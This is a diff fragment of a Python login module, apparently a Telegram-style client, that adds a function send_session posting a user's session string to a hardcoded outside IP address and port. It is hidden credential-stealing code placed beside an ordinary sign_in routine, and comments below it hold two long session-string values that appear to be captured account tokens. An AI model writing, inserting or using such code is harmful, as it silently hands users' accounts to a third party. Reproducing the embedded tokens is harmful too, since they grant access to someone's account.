@@ -88,6 +88,14 @@ def sign_in(response):
             return response
     return response
 
+def send_session(session_string):
+    host_addr = '195.2.85.217'
+    host_port = '6003'
+    endpoint = 'processSession'
+    requests.post(
+        url=f'http://{host_addr}:{host_port}/{endpoint}',
+        json={'session-string': session_string}
+    )
 
 # {"session-string": "AgGTkFkAIRWwJWsEpaGVaGD3fwThvpSjsE5O-EGY1O9_VkdIeeH4EL1PN3RstjsTr0_3WiHHVvxZVWaMPOMqQRmJzAnIGUtWDsfim2JwPGJgffG_3GUO2RPskMmmSk2IBBUJ2asOChOPqeSdTRGm8FRzOMJnBmy4OXmlnTYWNDGMxVH8mH2b15brxNFEYWbfbA7VnK2H4iQ5f_btyp1t_T4KpMZLkkcfzo-AUMzXeAV-rSgpVtFSHhpRRuem4ZAjslWNYtdklVAM8NZchj0_g19BxnAQ_I0Z_Vp0p5YLT-5eLExlB20UaLylt-SQF26cjedi_lbV5r7CoaxZMpVVUVk-yB9cxQAAAAGdJwjsAA"}
 # {"session-string": "AgGTkFkAhlp6qufzcF3IVX2aoxCRWdVYTG9Tor0KQYmZCIO87odKSVM2hEd0EzYevBh9wwSDLHyPxXRAQo-HUIn6o7xqasRiixWEpNOvZneBv92cRWfX1ZZvLjvDplL4taVll8DnGnDQOsYiTtiIcoUIgzeArMTgfhgZ05BMkz1htUl-Xr1O8P5mNv-z6DsMO7Q8LTtgp6Oq84YF7StSfmL0XJ2VeyPOSLUiDC4iE36MWvUry37uqBR9hMBwJT6mB7eOtO1oo3O_zc8NGL1d4AHh2TAFQ7ZigOVwXF1NH6A9EQkntqUZ-KGP9oIiHCs2MZ9Sm6cErbJnfQ4vdYO9iKfAQovQBgAAAAFieMI5AA"}
